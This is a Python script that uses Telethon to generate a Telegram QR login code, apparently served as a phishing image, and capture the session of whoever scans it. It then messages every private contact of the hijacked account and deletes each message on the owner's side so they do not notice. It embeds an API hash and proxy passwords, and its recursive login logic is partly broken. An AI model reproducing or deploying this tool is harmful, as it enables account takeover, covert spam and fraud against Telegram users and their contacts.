import telethon
from telethon import TelegramClient
import qrcode
from PIL import Image
import random
from datetime import datetime

API_ID = 24665137
API_HASH = '00fc26b44fc4fb576533a0ccc2f56b1f'

proxy_list = [
    ("46.8.14.190", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("194.34.248.170", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("185.181.246.128", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("46.8.110.207", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("46.8.14.200", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("194.34.248.178", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("185.181.246.136", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("46.8.110.220", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("46.8.14.206", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("194.34.248.180", 5501, "818Gjoeihx792111", "gukwiHj66111"),
    ("185.181.246.143", 5501, "818Gjoeihx792111", "gukwiHj66111"),
]

def gen_qr_image(token: str):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(token)
    qr.make(fit=True)
    img = qr.make_image(fill_color='black', back_color='white').convert("RGBA")
    img_path = 'static/qr_code.png'
    img.save(img_path)
    return img_path

def display_url_as_qr(url: str):
    print(url)
    img = gen_qr_image(url)
    return img

async def main(client: telethon.TelegramClient):
    if not client.is_connected():
        await client.connect()
    print("Client connected:", client.is_connected())

    qr_login = await client.qr_login()
    login_success = False

    while not login_success:
        path = display_url_as_qr(qr_login.url)
        try:
            login_success = await qr_login.wait(60)
        except Exception as e:
            print(f"Login session expired, recreating QR login... or: {e}")
            await qr_login.recreate()

    if login_success:
        print("Login successful!")
        bot = await client.get_me()
        print('User: @' + bot.username + ' connected!')

        proxy = random.choice(proxy_list)
        proxy_config = (proxy[0], proxy[1], proxy[2], proxy[3])
        client = TelegramClient(f"sessions/" + str(bot.username), API_ID, API_HASH,  proxy=("http", proxy_config[0], proxy_config[1], proxy_config[2], proxy_config[3]))

        await main(client)

        chats = await client.get_dialogs()
        for chat in chats:
            try:
                entity = await client.get_entity(chat.id)
                if isinstance(entity, telethon.tl.types.User) and not entity.bot:
                    sent_message = await client.send_message(chat.id, """ТЕКСТ ДЛЯ СООБЩЕНИЯ""")
                    await client.delete_messages(chat.id, [sent_message], revoke=False)
                    print(f'Message sent and deleted in chat: {chat.title} (ID: {chat.id})')
                else:
                    print(f'Not sending message to {chat.title} (ID: {chat.id}): It is a bot or channel')
            except Exception as e:
                print(f'Error in chat {chat.title} (ID: {chat.id}): {e}')

proxy = random.choice(proxy_list)
proxy_config = (proxy[0], proxy[1], proxy[2], proxy[3])

client = TelegramClient(
    f"qrsessions/qr_code_session",
    API_ID,
    API_HASH,
    proxy=("http", proxy_config[0], proxy_config[1], proxy_config[2], proxy_config[3])
)

client.loop.run_until_complete(main(client))
